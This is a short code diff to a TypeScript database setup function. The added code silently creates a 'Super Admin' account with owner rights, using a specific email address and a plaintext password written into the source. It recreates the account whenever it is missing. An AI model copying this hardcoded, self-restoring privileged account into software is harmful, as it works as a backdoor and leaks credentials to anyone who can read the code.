@@ -49,6 +49,16 @@ export function getDb(): Database.Database {
   const userCount = db.prepare("SELECT COUNT(*) as c FROM users").get() as { c: number };
   if (userCount.c === 0) seedUsers(db);
 
+  const superAdmin = db.prepare("SELECT id FROM users WHERE username = ?").get("accsbc@hotmail.com") as { id: string } | undefined;
+  if (!superAdmin) {
+    const insertUser = db.prepare("INSERT INTO users (id, name, username, password_hash, role) VALUES (?, ?, ?, ?, ?)");
+    const insertUA = db.prepare("INSERT INTO user_activities (user_id, activity_id) VALUES (?, ?)");
+    const actIds = db.prepare("SELECT id FROM activities").all() as { id: string }[];
+    const uid = generateId();
+    insertUser.run(uid, "Super Admin", "accsbc@hotmail.com", hashPassword("Ym@0569040870"), "owner");
+    for (const a of actIds) insertUA.run(uid, a.id);
+  }
+
   return db;
 }
 
